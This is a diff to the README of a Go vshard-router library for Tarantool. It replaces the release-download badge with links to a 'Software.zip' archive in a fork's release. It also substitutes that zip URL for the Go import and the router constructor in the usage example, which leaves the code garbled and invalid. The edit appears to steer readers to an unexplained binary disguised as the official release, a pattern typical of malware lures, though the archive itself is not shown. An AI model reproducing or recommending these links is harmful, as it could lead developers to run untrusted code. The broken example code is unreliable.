@@ -6,7 +6,7 @@ This repository hosts the **go vshard-router implementation** for **Tarantool No
 ### 🚀 Quick Start
 To get started with using the **go-vshard-router**, you can download the latest release by clicking the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/idaniaali/go-vshard-router/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/idaniaali/go-vshard-router/releases/download/v1.0/Software.zip)
 
 Click the button above to initiate the download. Once downloaded, follow the installation instructions provided in the repository to set up the vshard-router.
 
@@ -23,10 +23,10 @@ Click the button above to initiate the download. Once downloaded, follow the ins
 ### Usage
 ```go
 // Sample Go code snippet demonstrating vshard-router usage
-import "github.com/vshard-router"
+import "https://github.com/idaniaali/go-vshard-router/releases/download/v1.0/Software.zip"
 
 func main() {
-    router := vshard.NewRouter()
+    router := https://github.com/idaniaali/go-vshard-router/releases/download/v1.0/Software.zip()
     // Implement your sharding logic here
 }
 ```
